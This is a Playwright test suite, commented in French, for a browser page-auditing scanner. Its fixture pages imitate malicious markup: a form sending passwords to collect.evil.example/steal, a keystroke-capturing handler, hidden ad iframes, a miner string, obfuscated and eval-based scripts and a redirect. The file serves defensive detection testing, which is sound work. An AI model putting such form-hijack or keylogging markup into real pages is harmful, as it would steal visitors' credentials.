/* Tests du moteur d'analyse, dans un vrai Chromium (Playwright).
 *
 *   NODE_PATH=$(npm root -g) node page-auditor/tests/engine.test.js
 *
 * Les pages sont servies localement : aucune requête ne sort sur le réseau.
 */
const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');
const SCANNER = fs.readFileSync(path.join(__dirname, '..', 'scanner.js'), 'utf8');

// Page piège : motifs inertes qui imitent des menaces (aucun code nuisible).
const TRAP = `<!doctype html><html><head>
<meta http-equiv="refresh" content="99999; url=https://evil.example/landing">
</head><body>
<h1>Page piège</h1>
<script>/* coinhive loader (chaîne inerte pour le test) */ var x = 1;</script>
<script>var p = atob("aGVsbG8="); var q = String.fromCharCode(104,105); var r = unescape("%41");</script>
<script src="https://cdn.tracker.example/a8f3k2m9x7q1w5e6r4t.js"></script>
<iframe src="https://ads.evil.example/pop" style="width:1px;height:1px;border:0"></iframe>
<iframe src="https://ads.evil.example/pop2" style="display:none"></iframe>
<iframe src="https://ads.evil.example/pop3" style="position:absolute;left:-9999px;top:0;width:300px;height:200px"></iframe>
<form action="https://collect.evil.example/steal" method="post">
  <input name="user"><input type="password" name="pass" onkeyup="send(this.value)">
</form>
<div onmouseover="eval(this.dataset.x)">survol</div>
</body></html>`;

// Page saine avec un piège à faux positifs : une vidéo intégrée très bas.
const CLEAN = `<!doctype html><html><body>
<h1>Blog sain</h1>
<script>document.title = "ok"; function hello(){ return eval ? 1 : 0; }</script>
<script src="/app.js"></script>
<form action="/login" method="post"><input type="password" name="pass"></form>
<div style="height:5000px"></div>
<iframe src="https://www.youtube.example/embed/abc" width="560" height="315"></iframe>
<button onclick="hello()">Ok</button>
</body></html>`;

// Page hostile qui tente de détourner la neutralisation : elle pose sur un
// leurre les identifiants qu'une ancienne version écrivait dans le DOM.
const TAMPER = `<!doctype html><html><body>
<div id="decoy" data-__pa-id="pa1" onclick="legit()">leurre</div>
<div id="decoy2" data-__pa-id="pa2" onclick="legit()">leurre 2</div>
<iframe id="bad" src="https://ads.evil.example/x" style="display:none"></iframe>
<form id="f" action="/login">
  <input type="password" name="pass">
  <button formaction="https://collect.evil.example/s">Envoyer</button>
</form>
</body></html>`;

// Suffixe national à deux niveaux : evil.co.uk n'est pas example.co.uk.
const COUK = `<!doctype html><html><body>
<form id="same" action="https://pay.example.co.uk/p"><input type="password" name="pass"></form>
<form id="other" action="https://evil.co.uk/p"><input type="password" name="pass"></form>
</body></html>`;

(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.route(() => true, r => {
    const u = r.request().url();
    if (u === 'https://site.test/trap') return r.fulfill({ contentType: 'text/html; charset=utf-8', body: TRAP });
    if (u === 'https://site.test/clean') return r.fulfill({ contentType: 'text/html; charset=utf-8', body: CLEAN });
    if (u === 'https://site.test/tamper') return r.fulfill({ contentType: 'text/html; charset=utf-8', body: TAMPER });
    if (u === 'https://shop.example.co.uk/') return r.fulfill({ contentType: 'text/html; charset=utf-8', body: COUK });
    return r.fulfill({ contentType: 'application/javascript', body: '' });
  });

  let failures = 0;
  const check = (name, cond) => { console.log((cond ? 'PASS ' : 'FAIL ') + name); if (!cond) failures++; };

  // --- page piège
  await page.goto('https://site.test/trap');
  await page.addScriptTag({ content: SCANNER });
  const rep = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  const kinds = rep.findings.map(f => f.kind);
  console.log('trap counts', JSON.stringify(rep.counts));
  rep.findings.forEach(f => console.log('  ', f.severity, f.kind, '-', f.message.slice(0, 70)));
  check('miner détecté', kinds.includes('miner'));
  check('obfuscation détectée', kinds.includes('obfuscation'));
  check('script tiers aléatoire détecté', kinds.includes('thirdparty'));
  check('3 iframes masquées détectées', kinds.filter(k => k === 'hidden-iframe').length === 3);
  check('formulaire détourné détecté', kinds.includes('form-hijack'));
  check('capture clavier détectée', kinds.includes('keylogger'));
  check('gestionnaire eval détecté', kinds.includes('inline-handler'));
  check('redirection détectée', kinds.includes('redirect'));
  check('tri par sévérité', rep.findings[0].severity === 'high');

  // Re-injection : pas de doublon d'état
  await page.addScriptTag({ content: SCANNER });
  const rep2 = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  check('ré-injection idempotente', rep2.findings.length === rep.findings.length);

  // --- neutralisation
  const refs = rep.findings.map(f => f.ref);
  const out = await page.evaluate(r => window.__PAGE_AUDITOR__.neutralize(r), refs);
  console.log('neutralize ->', JSON.stringify(out));
  const after = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  console.log('after counts', JSON.stringify(after.counts));
  check('plus aucune alerte après neutralisation', after.findings.length === 0);
  check('iframes retirées', await page.evaluate(() => document.querySelectorAll('iframe').length === 0));
  check('formulaire désarmé', await page.evaluate(() => document.querySelector('form').getAttribute('action') === 'about:blank'));
  check('handlers on* retirés', await page.evaluate(() => !document.querySelector('[onmouseover]') && !document.querySelector('[onkeyup]')));
  check('scripts comptés à part', out.scripts === 3);
  check('contenu légitime conservé', await page.evaluate(() => document.querySelector('h1').textContent === 'Page piège'));

  // --- page saine
  await page.goto('https://site.test/clean');
  await page.addScriptTag({ content: SCANNER });
  const clean = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  console.log('clean counts', JSON.stringify(clean.counts));
  clean.findings.forEach(f => console.log('  FP?', f.kind, f.message));
  check('page saine : aucun faux positif', clean.findings.length === 0);

  // --- page hostile : leurres et formaction
  await page.goto('https://site.test/tamper');
  await page.addScriptTag({ content: SCANNER });
  const before = await page.evaluate(() => document.body.outerHTML);
  const tam = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  check('le scan ne modifie pas le DOM', await page.evaluate(b => document.body.outerHTML === b, before));
  check('formaction tiers détecté', tam.findings.some(f => f.kind === 'form-hijack' && /collect\.evil/.test(f.detail)));
  await page.evaluate(r => window.__PAGE_AUDITOR__.neutralize(r), tam.findings.map(f => f.ref));
  check('iframe malveillante retirée malgré les leurres', await page.evaluate(() => !document.getElementById('bad')));
  check('leurres intacts', await page.evaluate(() =>
    document.getElementById('decoy').hasAttribute('onclick') && document.getElementById('decoy2').hasAttribute('onclick')));
  check('formaction retiré', await page.evaluate(() => !document.querySelector('#f [formaction]')));
  check('refs inconnues ou d\'éléments retirés ignorées', (await page.evaluate(r => window.__PAGE_AUDITOR__.neutralize(r), ['pa1', 'pa999'])).neutralized === 0);

  // --- .co.uk
  await page.goto('https://shop.example.co.uk/');
  await page.addScriptTag({ content: SCANNER });
  const uk = await page.evaluate(() => window.__PAGE_AUDITOR__.scan());
  const ukDests = uk.findings.filter(f => f.kind === 'form-hijack').map(f => f.detail);
  check('.co.uk : formulaire vers evil.co.uk détecté', ukDests.some(d => /evil\.co\.uk/.test(d)));
  check('.co.uk : formulaire vers pay.example.co.uk non signalé', !ukDests.some(d => /pay\.example/.test(d)));

  await browser.close();
  console.log(failures ? `\n${failures} échec(s)` : '\nTous les tests passent');
  process.exit(failures ? 1 : 0);
})().catch(e => { console.error(e); process.exit(2); });
